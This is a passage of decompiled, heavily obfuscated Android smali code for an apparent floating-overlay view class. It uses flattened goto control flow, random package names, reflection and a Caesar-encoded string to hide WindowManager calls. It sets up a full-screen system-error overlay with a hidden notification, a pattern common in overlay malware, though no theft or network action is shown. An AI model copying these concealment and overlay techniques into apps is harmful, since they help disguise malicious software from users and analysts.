    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Landroid/view/View;

    aput-object v5, v3, v2

    aput-object p0, v4, v2

    const/4 v2, 0x1

    const-class v5, Landroid/view/ViewGroup$LayoutParams;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "updateViewLayout"

    const-class v5, Landroid/view/WindowManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1

    :goto_3
    nop

    iget-object v1, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    nop

    goto :goto_2

    :goto_4
    nop

    check-cast v0, Landroid/view/WindowManager;

    nop

    goto :goto_3

    :goto_5
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_4

    :goto_6
    nop

    const-string v1, "xjoepx"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_5

    :goto_7
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v0

    nop

    goto :goto_6

    :goto_8
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->onSetupLayoutParams()V

    nop

    goto :goto_7

    :goto_9
    nop

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->inflateView()V

    nop

    goto :goto_8

    :goto_a
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->removeAllViews()V

    nop

    goto :goto_9

    :goto_b
    nop

    if-eqz v0, :cond_0

    nop

    goto :goto_a

    :goto_c
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->isVisible()Z

    move-result v0

    nop

    goto :goto_b

    :goto_d
    nop

    nop
.end method

.method private xrefreshViews()V
    .locals 4

    .prologue
    nop

    goto :goto_0

    :goto_0
    nop

    return-void

    nop

    goto :goto_1

    :goto_1
    nop

    nop
.end method

.method private xreload()V
    .locals 4

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->load()V

    nop

    goto :goto_0

    :goto_2
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->unload()V

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xsetVisibility(I)V
    .locals 9
    .param p1, "visibility"    # I

    .prologue
    nop

    goto :goto_17

    :goto_0
    nop

    goto :goto_3

    nop

    goto :goto_18

    :cond_0
    :goto_1
    nop

    move v0, v1

    nop

    goto :goto_0

    :goto_2
    nop

    goto :goto_f

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {v2, v3, v0}, Lcom/EDzgPz/KwIOuS/dNuGTM;->moveToBackground(IZ)V

    nop

    goto :goto_2

    :goto_4
    nop

    if-eqz v4, :cond_0

    nop

    goto :goto_3

    :goto_5
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->showNotificationHidden()Z

    move-result v4

    nop

    goto :goto_4

    :goto_6
    nop

    iget v3, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->notificationId:I

    nop

    goto :goto_5

    :cond_1
    :goto_7
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getService()Lcom/EDzgPz/KwIOuS/dNuGTM;

    move-result-object v2

    nop

    goto :goto_6

    :goto_8
    nop

    goto :goto_10

    nop

    goto :goto_7

    :cond_2
    :goto_9
    nop

    move v0, v1

    nop

    goto :goto_8

    :cond_3
    :goto_a
    nop

    return-void

    nop

    goto :goto_9

    :goto_b
    nop

    invoke-super {p0, p1}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    nop

    goto :goto_a

    :goto_c
    nop

    if-eqz v0, :cond_3

    nop

    goto :goto_b

    :goto_d
    nop

    invoke-virtual {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn;->onVisibilityToChange(I)Z

    move-result v0

    nop

    goto :goto_c

    :goto_e
    nop

    if-eq v0, p1, :cond_3

    nop

    goto :goto_d

    :goto_f
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getVisibility()I

    move-result v0

    nop

    goto :goto_e

    :goto_10
    nop

    invoke-virtual {v2, v3, v0}, Lcom/EDzgPz/KwIOuS/dNuGTM;->moveToForeground(IZ)V

    nop

    goto :goto_f

    :goto_11
    nop

    if-eqz v4, :cond_2

    nop

    goto :goto_10

    :goto_12
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->showNotificationHidden()Z

    move-result v4

    nop

    goto :goto_11

    :goto_13
    nop

    iget v3, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->notificationId:I

    nop

    goto :goto_12

    :goto_14
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getService()Lcom/EDzgPz/KwIOuS/dNuGTM;

    move-result-object v2

    nop

    goto :goto_13

    :goto_15
    nop

    if-nez p1, :cond_1

    nop

    goto :goto_14

    :goto_16
    nop

    const/4 v0, 0x0

    nop

    goto :goto_15

    :goto_17
    nop

    const/4 v1, 0x1

    nop

    goto :goto_16

    :goto_18
    nop

    nop
.end method

.method private xsetupLayoutParams()V
    .locals 10

    .prologue
    nop

    goto :goto_c

    :goto_0
    nop

    return-void

    nop

    goto :goto_d

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->onSetupLayoutParams()V

    nop

    goto :goto_0

    :goto_2
    nop

    iput v1, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    nop

    goto :goto_1

    :goto_3
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getLayoutGravity()I

    move-result v1

    nop

    goto :goto_2

    :goto_4
    nop

    iget-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    nop

    goto :goto_3

    :goto_5
    nop

    iput-object v0, p0, Lcom/EDzgPz/KwIOuS/lvjaxn;->layoutParams:Landroid/view/WindowManager$LayoutParams;

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-direct/range {v0 .. v5}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    nop

    goto :goto_5

    :goto_7
    nop

    move v2, v1

    nop

    goto :goto_6

    :goto_8
    nop

    const/4 v5, -0x3

    nop

    goto :goto_7

    :goto_9
    nop

    const/16 v4, 0x100

    nop

    goto :goto_8

    :goto_a
    nop

    const/16 v3, 0x7da

    nop

    goto :goto_9

    :goto_b
    nop

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    nop

    goto :goto_a

    :goto_c
    nop

    const/4 v1, -0x1

    nop

    goto :goto_b

    :goto_d
    nop

    nop
.end method

.method private xshow()V
    .locals 5

    .prologue
    nop

    goto :goto_2

    :goto_0
    nop

    return-void

    nop

    goto :goto_3

    :goto_1
    nop

    invoke-super {p0, v0}, Landroid/widget/RelativeLayout;->setVisibility(I)V

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v0, 0x0

    nop

    goto :goto_1

    :goto_3
    nop

    nop
.end method

.method private xshowNotificationHidden()Z
    .locals 5

    .prologue
    nop

    goto :goto_1

    :goto_0
    nop

    return v0

    nop

    goto :goto_2

    :goto_1
    nop

    const/4 v0, 0x1

    nop

    goto :goto_0

    :goto_2
    nop

    nop
.end method

.method private xunload()V
    .locals 6

    .prologue
    nop

    goto :goto_6

    :goto_0
    nop

    return-void

    nop

    goto :goto_7

    :goto_1
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->removeAllViews()V

    nop

    goto :goto_0

    :goto_2
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Landroid/view/View;

    aput-object v5, v3, v2

    aput-object p0, v4, v2

    const-string v2, "removeView"

    const-class v5, Landroid/view/WindowManager;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    nop

    goto :goto_1

    :goto_3
    nop

    check-cast v0, Landroid/view/WindowManager;

    nop

    goto :goto_2

    :goto_4
    nop

    const/4 v2, 0x1

    new-array v3, v2, [Ljava/lang/Class;

    new-array v4, v2, [Ljava/lang/Object;

    const/4 v2, 0x0

    const-class v5, Ljava/lang/String;

    aput-object v5, v3, v2

    aput-object v1, v4, v2

    const-string v2, "getSystemService"

    const-class v5, Landroid/content/Context;

    invoke-virtual {v5, v2, v3}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v2

    invoke-virtual {v2, v0, v4}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/Object;

    nop

    goto :goto_3

    :goto_5
    nop

    const-string v1, "xjoepx"

    invoke-static/range {v1 .. v1}, Lcom/EncryptString;->applyCaesar(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    nop

    goto :goto_4

    :goto_6
    nop

    invoke-virtual {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->getContext()Landroid/content/Context;

    move-result-object v0

    nop

    goto :goto_5

    :goto_7
    nop

    nop
.end method


# virtual methods
.method protected addView()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xaddView()V

    return-void
.end method

.method protected animationView()Landroid/view/View;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xanimationView()Landroid/view/View;

    move-result-object v0

    return-object v0
.end method

.method public destory()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xdestory()V

    return-void
.end method

.method public getLayoutGravity()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xgetLayoutGravity()I

    move-result v0

    return v0
.end method

.method protected getLeftOnScreen()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xgetLeftOnScreen()I

    move-result v0

    return v0
.end method

.method public getService()Lcom/EDzgPz/KwIOuS/dNuGTM;
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xgetService()Lcom/EDzgPz/KwIOuS/dNuGTM;

    move-result-object v0

    return-object v0
.end method

.method protected getTopOnScreen()I
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xgetTopOnScreen()I

    move-result v0

    return v0
.end method

.method protected hide()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xhide()V

    return-void
.end method

.method public isVisible()Z
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xisVisible()Z

    move-result v0

    return v0
.end method

.method protected load()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xload()V

    return-void
.end method

.method protected onInflateView()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xonInflateView()V

    return-void
.end method

.method protected onSetupLayoutParams()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xonSetupLayoutParams()V

    return-void
.end method

.method protected onVisibilityToChange(I)Z
    .locals 5

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xonVisibilityToChange(I)Z

    move-result v0

    return v0
.end method

.method public refresh()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xrefresh()V

    return-void
.end method

.method public refreshLayout()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xrefreshLayout()V

    return-void
.end method

.method protected refreshViews()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xrefreshViews()V

    return-void
.end method

.method protected reload()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xreload()V

    return-void
.end method

.method public setVisibility(I)V
    .locals 4

    invoke-direct {p0, p1}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xsetVisibility(I)V

    return-void
.end method

.method protected show()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xshow()V

    return-void
.end method

.method protected showNotificationHidden()Z
    .locals 5

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xshowNotificationHidden()Z

    move-result v0

    return v0
.end method

.method protected unload()V
    .locals 4

    invoke-direct {p0}, Lcom/EDzgPz/KwIOuS/lvjaxn;->xunload()V

    return-void
.end method
